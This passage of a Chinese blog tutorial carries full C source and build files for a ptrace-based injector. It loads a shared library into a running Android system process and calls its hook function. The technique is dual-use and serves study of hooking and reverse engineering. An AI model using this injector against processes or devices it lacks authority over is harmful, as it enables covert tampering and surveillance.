line-height: 26px">if (ptrace_setregs(pid, regs) == -1</span></div><div><span style="font-size: 14px; line-height: 26px">&#124;&#124; ptrace_continue(pid) == -1) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">printf(&quot;error&#92;n&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">int stat = 0;</span></div><div><span style="font-size: 14px; line-height: 26px">waitpid(pid, &amp;stat, WUNTRACED);</span></div><div><span style="font-size: 14px; line-height: 26px">while (stat != 0xb7f) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace_continue(pid) == -1) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">printf(&quot;error&#92;n&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">waitpid(pid, &amp;stat, WUNTRACED);</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">return 0;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">#elif defined(__i386__)</span></div><div><span style="font-size: 14px; line-height: 26px">long ptrace_call(pid_t pid, uint32_t addr, long *params, uint32_t num_params, struct user_regs_struct * regs)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">regs-&gt;esp -= (num_params) * sizeof(long) ;</span></div><div><span style="font-size: 14px; line-height: 26px">ptrace_writedata(pid, (void *)regs-&gt;esp, (uint8_t *)params, (num_params) * sizeof(long));</span></div><div><span style="font-size: 14px; line-height: 26px">long tmp_addr = 0x00;</span></div><div><span style="font-size: 14px; line-height: 26px">regs-&gt;esp -= sizeof(long);</span></div><div><span style="font-size: 14px; line-height: 26px">ptrace_writedata(pid, regs-&gt;esp, (char *)&amp;tmp_addr, sizeof(tmp_addr));</span></div><div><span style="font-size: 14px; line-height: 26px">regs-&gt;eip = addr;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace_setregs(pid, regs) == -1</span></div><div><span style="font-size: 14px; line-height: 26px">&#124;&#124; ptrace_continue( pid) == -1) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">printf(&quot;error&#92;n&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">int stat = 0;</span></div><div><span style="font-size: 14px; line-height: 26px">waitpid(pid, &amp;stat, WUNTRACED);</span></div><div><span style="font-size: 14px; line-height: 26px">while (stat != 0xb7f) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace_continue(pid) == -1) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">printf(&quot;error&#92;n&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">waitpid(pid, &amp;stat, WUNTRACED);</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">return 0;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">#else</span></div><div><span style="font-size: 14px; line-height: 26px">#error &quot;Not supported&quot;</span></div><div><span style="font-size: 14px; line-height: 26px">#endif</span></div><div><span style="font-size: 14px; line-height: 26px">int ptrace_getregs(pid_t pid, struct pt_regs * regs)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace(PTRACE_GETREGS, pid, NULL, regs) &lt; 0) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">perror(&quot;ptrace_getregs: Can not get register values&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">return 0;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">int ptrace_setregs(pid_t pid, struct pt_regs * regs)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace(PTRACE_SETREGS, pid, NULL, regs) &lt; 0) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">perror(&quot;ptrace_setregs: Can not set register values&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">return 0;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">int ptrace_continue(pid_t pid)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace(PTRACE_CONT, pid, NULL, 0) &lt; 0) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">perror(&quot;ptrace_cont&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">return 0;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">int ptrace_attach(pid_t pid)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace(PTRACE_ATTACH, pid, NULL, 0) &lt; 0) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">perror(&quot;ptrace_attach&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">int status = 0;</span></div><div><span style="font-size: 14px; line-height: 26px">waitpid(pid, &amp;status , WUNTRACED);</span></div><div><span style="font-size: 14px; line-height: 26px">return 0;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">int ptrace_detach(pid_t pid)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace(PTRACE_DETACH, pid, NULL, 0) &lt; 0) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">perror(&quot;ptrace_detach&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">return 0;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">void* get_module_base(pid_t pid, const char* module_name)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">FILE *fp;</span></div><div><span style="font-size: 14px; line-height: 26px">long addr = 0;</span></div><div><span style="font-size: 14px; line-height: 26px">char *pch;</span></div><div><span style="font-size: 14px; line-height: 26px">char filename[32];</span></div><div><span style="font-size: 14px; line-height: 26px">char line[1024];</span></div><div><span style="font-size: 14px; line-height: 26px">if (pid &lt; 0) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">/* self process */</span></div><div><span style="font-size: 14px; line-height: 26px">snprintf(filename, sizeof(filename), &quot;/proc/self/maps&quot;, pid);</span></div><div><span style="font-size: 14px; line-height: 26px">&#125; else &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">snprintf(filename, sizeof(filename), &quot;/proc/%d/maps&quot;, pid);</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">fp = fopen(filename, &quot;r&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">if (fp != NULL) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">while (fgets(line, sizeof(line), fp)) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">if (strstr(line, module_name)) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">pch = strtok( line, &quot;-&quot; );</span></div><div><span style="font-size: 14px; line-height: 26px">addr = strtoul( pch, NULL, 16 );</span></div><div><span style="font-size: 14px; line-height: 26px">if (addr == 0x8000)</span></div><div><span style="font-size: 14px; line-height: 26px">addr = 0;</span></div><div><span style="font-size: 14px; line-height: 26px">break;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">fclose(fp) ;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">return (void *)addr;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">void* get_remote_addr(pid_t target_pid, const char* module_name, void* local_addr)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">void* local_handle, *remote_handle;</span></div><div><span style="font-size: 14px; line-height: 26px">local_handle = get_module_base(-1, module_name);</span></div><div><span style="font-size: 14px; line-height: 26px">remote_handle = get_module_base(target_pid, module_name);</span></div><div><span style="font-size: 14px; line-height: 26px">DEBUG_PRINT(&quot;[+] get_remote_addr: local[%x], remote[%x]&#92;n&quot;, local_handle, remote_handle);</span></div><div><span style="font-size: 14px; line-height: 26px">void * ret_addr = (void *)((uint32_t)local_addr + (uint32_t)remote_handle - (uint32_t)local_handle);</span></div><div><span style="font-size: 14px; line-height: 26px">#if defined(__i386__)</span></div><div><span style="font-size: 14px; line-height: 26px">if (!strcmp(module_name, libc_path)) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">ret_addr += 2;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">#endif</span></div><div><span style="font-size: 14px; line-height: 26px">return ret_addr;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">int find_pid_of(const char *process_name)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">int id;</span></div><div><span style="font-size: 14px; line-height: 26px">pid_t pid = -1;</span></div><div><span style="font-size: 14px; line-height: 26px">DIR* dir;</span></div><div><span style="font-size: 14px; line-height: 26px">FILE *fp;</span></div><div><span style="font-size: 14px; line-height: 26px">char filename[32];</span></div><div><span style="font-size: 14px; line-height: 26px">char cmdline[256];</span></div><div><span style="font-size: 14px; line-height: 26px">struct dirent * entry;</span></div><div><span style="font-size: 14px; line-height: 26px">if (process_name == NULL)</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">dir = opendir(&quot;/proc&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">if (dir == NULL)</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">while((entry = readdir(dir)) != NULL) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">id = atoi(entry-&gt;d_name);</span></div><div><span style="font-size: 14px; line-height: 26px">if (id != 0) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">sprintf(filename, &quot;/proc/%d/cmdline&quot;, id);</span></div><div><span style="font-size: 14px; line-height: 26px">fp = fopen(filename, &quot;r&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">if (fp) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">fgets(cmdline, sizeof(cmdline), fp);</span></div><div><span style="font-size: 14px; line-height: 26px">fclose(fp);</span></div><div><span style="font-size: 14px; line-height: 26px">if (strcmp(process_name, cmdline) == 0) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">/* process found */</span></div><div><span style="font-size: 14px; line-height: 26px">pid = id;</span></div><div><span style="font-size: 14px; line-height: 26px">break;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">closedir(dir);</span></div><div><span style="font-size: 14px; line-height: 26px">return pid;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">long ptrace_retval(struct pt_regs * regs)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">#if defined(__arm__)</span></div><div><span style="font-size: 14px; line-height: 26px">return regs-&gt;ARM_r0;</span></div><div><span style="font-size: 14px; line-height: 26px">#elif defined(__i386__)</span></div><div><span style="font-size: 14px; line-height: 26px">return regs-&gt;eax;</span></div><div><span style="font-size: 14px; line-height: 26px">#else</span></div><div><span style="font-size: 14px; line-height: 26px">#error &quot;Not supported&quot;</span></div><div><span style="font-size: 14px; line-height: 26px">#endif</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">long ptrace_ip(struct pt_regs * regs)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">#if defined(__arm__)</span></div><div><span style="font-size: 14px; line-height: 26px">return regs-&gt;ARM_pc;</span></div><div><span style="font-size: 14px; line-height: 26px">#elif defined(__i386__)</span></div><div><span style="font-size: 14px; line-height: 26px">return regs-&gt;eip;</span></div><div><span style="font-size: 14px; line-height: 26px">#else</span></div><div><span style="font-size: 14px; line-height: 26px">#error &quot;Not supported&quot;</span></div><div><span style="font-size: 14px; line-height: 26px">#endif</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">int ptrace_call_wrapper(pid_t target_pid, const char * func_name, void * func_addr, long * parameters, int param_num, struct pt_regs * regs)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">DEBUG_PRINT(&quot;[+] Calling %s in target process.&#92;n&quot;, func_name);</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace_call(target_pid, (uint32_t)func_addr, parameters, param_num, regs) == -1)</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace_getregs(target_pid, regs) == -1)</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">DEBUG_PRINT(&quot;[+] Target process returned from %s, return value=%x, pc=%x &#92;n&quot;,</span></div><div><span style="font-size: 14px; line-height: 26px">func_name, ptrace_retval(regs), ptrace_ip(regs));</span></div><div><span style="font-size: 14px; line-height: 26px">return 0;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">int inject_remote_process(pid_t target_pid, const char *library_path, const char *function_name, const char *param, size_t param_size)</span></div><div><span style="font-size: 14px; line-height: 26px">&#123;</span></div><div><span style="font-size: 14px; line-height: 26px">int ret = -1;</span></div><div><span style="font-size: 14px; line-height: 26px">void *mmap_addr, *dlopen_addr, *dlsym_addr, *dlclose_addr, *dlerror_addr;</span></div><div><span style="font-size: 14px; line-height: 26px">void *local_handle, *remote_handle, *dlhandle;</span></div><div><span style="font-size: 14px; line-height: 26px">uint8_t *map_base = 0;</span></div><div><span style="font-size: 14px; line-height: 26px">uint8_t *dlopen_param1_ptr, *dlsym_param2_ptr, *saved_r0_pc_ptr, *inject_param_ptr, *remote_code_ptr, *local_code_ptr;</span></div><div><span style="font-size: 14px; line-height: 26px">struct pt_regs regs, original_regs;</span></div><div><span style="font-size: 14px; line-height: 26px">extern uint32_t _dlopen_addr_s, _dlopen_param1_s, _dlopen_param2_s, _dlsym_addr_s, &#92;</span></div><div><span style="font-size: 14px; line-height: 26px">_dlsym_param2_s, _dlclose_addr_s, _inject_start_s, _inject_end_s, _inject_function_param_s, &#92;</span></div><div><span style="font-size: 14px; line-height: 26px">_saved_cpsr_s, _saved_r0_pc_s;</span></div><div><span style="font-size: 14px; line-height: 26px">uint32_t code_length;</span></div><div><span style="font-size: 14px; line-height: 26px">long parameters[10];</span></div><div><span style="font-size: 14px; line-height: 26px">DEBUG_PRINT(&quot;[+] Injecting process: %d&#92;n&quot;, target_pid);</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace_attach(target_pid) == -1)</span></div><div><span style="font-size: 14px; line-height: 26px">goto exit;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace_getregs(target_pid, &amp;regs) == -1)</span></div><div><span style="font-size: 14px; line-height: 26px">goto exit;</span></div><div><span style="font-size: 14px; line-height: 26px">/* save original registers */</span></div><div><span style="font-size: 14px; line-height: 26px">memcpy(&amp;original_regs, &amp;regs, sizeof(regs));</span></div><div><span style="font-size: 14px; line-height: 26px">mmap_addr = get_remote_addr(target_pid, libc_path, (void *)mmap);</span></div><div><span style="font-size: 14px; line-height: 26px">DEBUG_PRINT(&quot;[+] Remote mmap address: %x&#92;n&quot;, mmap_addr);</span></div><div><span style="font-size: 14px; line-height: 26px">/* call mmap */</span></div><div><span style="font-size: 14px; line-height: 26px">parameters[0] = 0; // addr</span></div><div><span style="font-size: 14px; line-height: 26px">parameters[1] = 0x4000; // size</span></div><div><span style="font-size: 14px; line-height: 26px">parameters[2] = PROT_READ &#124; PROT_WRITE &#124; PROT_EXEC; // prot</span></div><div><span style="font-size: 14px; line-height: 26px">parameters[3] = MAP_ANONYMOUS &#124; MAP_PRIVATE; // flags</span></div><div><span style="font-size: 14px; line-height: 26px">parameters[4] = 0; //fd</span></div><div><span style="font-size: 14px; line-height: 26px">parameters[5] = 0; //offset</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace_call_wrapper(target_pid, &quot;mmap&quot;, mmap_addr, parameters, 6, &amp;regs) == -1)</span></div><div><span style="font-size: 14px; line-height: 26px">goto exit;</span></div><div><span style="font-size: 14px; line-height: 26px">map_base = ptrace_retval(&amp;regs);</span></div><div><span style="font-size: 14px; line-height: 26px">dlopen_addr = get_remote_addr( target_pid, linker_path, (void *)dlopen );</span></div><div><span style="font-size: 14px; line-height: 26px">dlsym_addr = get_remote_addr( target_pid, linker_path, (void *)dlsym );</span></div><div><span style="font-size: 14px; line-height: 26px">dlclose_addr = get_remote_addr( target_pid, linker_path, (void *)dlclose );</span></div><div><span style="font-size: 14px; line-height: 26px">dlerror_addr = get_remote_addr( target_pid, linker_path, (void *)dlerror );</span></div><div><span style="font-size: 14px; line-height: 26px">DEBUG_PRINT(&quot;[+] Get imports: dlopen: %x, dlsym: %x, dlclose: %x, dlerror: %x&#92;n&quot;,</span></div><div><span style="font-size: 14px; line-height: 26px">dlopen_addr, dlsym_addr, dlclose_addr, dlerror_addr);</span></div><div><span style="font-size: 14px; line-height: 26px">printf(&quot;library path = %s&#92;n&quot;, library_path);</span></div><div><span style="font-size: 14px; line-height: 26px">ptrace_writedata(target_pid, map_base, library_path, strlen(library_path) + 1);</span></div><div><span style="font-size: 14px; line-height: 26px">parameters[0] = map_base;</span></div><div><span style="font-size: 14px; line-height: 26px">parameters[1] = RTLD_NOW&#124; RTLD_GLOBAL;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace_call_wrapper(target_pid, &quot;dlopen&quot;, dlopen_addr, parameters, 2, &amp;regs) == -1)</span></div><div><span style="font-size: 14px; line-height: 26px">goto exit;</span></div><div><span style="font-size: 14px; line-height: 26px">void * sohandle = ptrace_retval(&amp;regs);</span></div><div><span style="font-size: 14px; line-height: 26px">#define FUNCTION_NAME_ADDR_OFFSET 0x100</span></div><div><span style="font-size: 14px; line-height: 26px">ptrace_writedata(target_pid, map_base + FUNCTION_NAME_ADDR_OFFSET, function_name, strlen(function_name) + 1);</span></div><div><span style="font-size: 14px; line-height: 26px">parameters[0] = sohandle;</span></div><div><span style="font-size: 14px; line-height: 26px">parameters[1] = map_base + FUNCTION_NAME_ADDR_OFFSET;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace_call_wrapper(target_pid, &quot;dlsym&quot;, dlsym_addr, parameters, 2, &amp;regs) == -1)</span></div><div><span style="font-size: 14px; line-height: 26px">goto exit;</span></div><div><span style="font-size: 14px; line-height: 26px">void * hook_entry_addr = ptrace_retval(&amp;regs);</span></div><div><span style="font-size: 14px; line-height: 26px">DEBUG_PRINT(&quot;hook_entry_addr = %p&#92;n&quot;, hook_entry_addr);</span></div><div><span style="font-size: 14px; line-height: 26px">#define FUNCTION_PARAM_ADDR_OFFSET 0x200</span></div><div><span style="font-size: 14px; line-height: 26px">ptrace_writedata(target_pid, map_base + FUNCTION_PARAM_ADDR_OFFSET, param, strlen(param) + 1);</span></div><div><span style="font-size: 14px; line-height: 26px">parameters[0] = map_base + FUNCTION_PARAM_ADDR_OFFSET;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace_call_wrapper(target_pid, &quot;hook_entry&quot;, hook_entry_addr, parameters, 1, &amp;regs) == -1)</span></div><div><span style="font-size: 14px; line-height: 26px">goto exit;</span></div><div><span style="font-size: 14px; line-height: 26px">printf(&quot;Press enter to dlclose and detach&#92;n&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">getchar();</span></div><div><span style="font-size: 14px; line-height: 26px">parameters[0] = sohandle;</span></div><div><span style="font-size: 14px; line-height: 26px">if (ptrace_call_wrapper(target_pid, &quot;dlclose&quot;, dlclose, parameters, 1, &amp;regs) == -1)</span></div><div><span style="font-size: 14px; line-height: 26px">goto exit;</span></div><div><span style="font-size: 14px; line-height: 26px">/* restore */</span></div><div><span style="font-size: 14px; line-height: 26px">ptrace_setregs(target_pid, &amp;original_regs);</span></div><div><span style="font-size: 14px; line-height: 26px">ptrace_detach(target_pid);</span></div><div><span style="font-size: 14px; line-height: 26px">ret = 0;</span></div><div><span style="font-size: 14px; line-height: 26px">exit:</span></div><div><span style="font-size: 14px; line-height: 26px">return ret;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">int main(int argc, char** argv) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">pid_t target_pid;</span></div><div><span style="font-size: 14px; line-height: 26px">target_pid = find_pid_of(&quot;/system/bin/surfaceflinger&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">if (-1 == target_pid) &#123;</span></div><div><span style="font-size: 14px; line-height: 26px">printf(&quot;Can't find the process&#92;n&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">return -1;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><div><span style="font-size: 14px; line-height: 26px">//target_pid = find_pid_of(&quot;/data/test&quot;);</span></div><div><span style="font-size: 14px; line-height: 26px">inject_remote_process(target_pid, &quot;/data/libhello.so&quot;, &quot;hook_entry&quot;, &quot;I'm parameter!&quot;, strlen(&quot;I'm parameter!&quot;));</span></div><div><span style="font-size: 14px; line-height: 26px">return 0;</span></div><div><span style="font-size: 14px; line-height: 26px">&#125;</span></div><span style="font-size: 14px; line-height: 26px">注意上面的/system/bin/surfaceflinger进程我随手写的，你的设备上不一定有。没有的话挑其它的也行，前提是ps命令里能找到。</span></span><br /><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px"></p><span style="font-size: 14px; line-height: 26px; font-family: Arial">Android.mk:</span><div class="dp-highlighter bg_plain" style="font-family: Consolas, 'Courier New', Courier, mono, serif; border: 1px solid #1e4975; width: 936.53125px; overflow: auto; padding-top: 1px; color: #c0c0c0; line-height: 26px; margin: 18px 0px !important; background-color: #22252b"><ol style="margin: 0px; padding: 5px 0px; border: none; position: relative; list-style-position: initial; list-style-image: initial"><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">LOCAL_PATH := $(call my-dir)&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">include $(CLEAR_VARS)&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">LOCAL_MODULE := inject&nbsp;&nbsp; </span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">LOCAL_SRC_FILES := inject.c&nbsp;&nbsp; </span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">#shellcode.s&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">LOCAL_LDLIBS += -L$(SYSROOT)/usr/lib -llog&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">#LOCAL_FORCE_STATIC_EXECUTABLE := true&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">include $(BUILD_EXECUTABLE)&nbsp;&nbsp;</span></li></ol></div><span style="font-size: 14px; line-height: 26px; font-family: Arial">Application.mk:</span><div class="dp-highlighter bg_plain" style="font-family: Consolas, 'Courier New', Courier, mono, serif; border: 1px solid #1e4975; width: 936.53125px; overflow: auto; padding-top: 1px; color: #c0c0c0; line-height: 26px; margin: 18px 0px !important; background-color: #22252b"><ol style="margin: 0px; padding: 5px 0px; border: none; position: relative; list-style-position: initial; list-style-image: initial"><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">APP_ABI := x86 armeabi-v7a&nbsp;&nbsp;</span></li></ol></div><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">运行nkd-build编译成生x86和arm平台下的可执行文件：</p><div class="dp-highlighter bg_plain" style="font-family: Consolas, 'Courier New', Courier, mono, serif; border: 1px solid #1e4975; width: 936.53125px; overflow: auto; padding-top: 1px; color: #c0c0c0; line-height: 26px; margin: 18px 0px !important; background-color: #22252b"><ol style="margin: 0px; padding: 5px 0px; border: none; position: relative; list-style-position: initial; list-style-image: initial"><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">jzj@jzj-laptop:~/workspace/inject_hook/inject_jni$ ndk-build&nbsp;&nbsp;</span></li><li style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">Install&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: inject =&gt; libs/x86/inject&nbsp;&nbsp;</span></li><li class="alt" style="border: none; list-style: decimal-leading-zero outside; line-height: 13.1999998092651px; color: inherit; margin: 0px !important; padding: 0px 3px 0px 10px !important"><span style="margin: 0px; padding: 0px; border: none; background-color: inherit">Install&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: inject =&gt; libs/armeabi-v7a/inject&nbsp;&nbsp;</span></li></ol></div><br /><span style="font-size: 14px; line-height: 26px; font-family: Arial">再来生成要注入的so，创建目录及文件：</span><p style="margin: 0px; padding: 0px; font-family: Arial; font-size: 14px; line-height: 26px">jni<br />&nbsp;&nbsp;&nbsp;&nbsp;hello.c<br />&nbsp;&nbsp;&nbsp;&nbsp;Android.mk<br 